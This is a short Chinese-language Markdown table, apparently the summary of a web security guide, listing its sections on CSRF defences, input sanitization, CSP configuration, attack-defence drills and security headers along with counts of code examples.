| CSRF | 攻击原理 + 4 种防御方案对比 | 8+ |
| Sanitization | 上下文编码 + 富文本清洗 + 输入验证 | 12+ |
| CSP | 指令速查 + 3 种实战配置 | 6+ |
| 攻防演练 | 个人资料页/搜索/文件上传 3 个场景 | 9+ |
| 安全 Header/Checklist/陷阱 | 速查参考 | - |

**总代码示例**: 50+ 个
**文档大小**: ~35KB
